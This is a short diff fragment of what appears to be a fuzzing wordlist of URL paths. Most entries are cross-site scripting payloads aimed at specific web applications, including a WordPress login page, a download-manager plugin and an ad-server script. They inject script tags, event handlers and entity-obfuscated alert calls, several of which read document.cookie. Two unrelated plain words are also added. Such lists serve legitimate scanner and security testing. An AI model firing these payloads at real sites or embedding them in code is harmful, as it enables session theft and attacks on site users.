 wa.exe?ok=<svg/onload=%26%23097lert%26lpar;'mtk')>
+wantonfocus
 web/sa2/scriptlist.do?gui_pagenotabledata=><script>alert(document.cookie)</script>
 webapp/?fccc%27\%22%3e%3csvg/onload=alert(/xss/)%3e
 webapp/?fccc0\><script>alert(1)</script>5f43d=1
@@ -22106,6 +22346,7 @@ wp-login.php?login-error=<script>alert(document.domain)</script>
 wpdmpro/list-packages/?orderby=title%22%3e%3cscript%3ealert(1)%3c/script%3e&order=asc
 www/delivery/afr.php?refresh=10000&")',10000000);alert(1337);settimeout('alert("
 www/delivery/afr.php?refresh=10000&\),10000000);alert(1337);settimeout(alert(\
+wwwiraqoccupationfocusorguk
 wwwping/index.stm?wwwsite=<script>alert(document.cookie)</script>
 x<form id=test onforminput=javascript:alert(1)><input></form>
 x<form id=test><input></form><button form=test onformchange==javascript:alert(1)>x
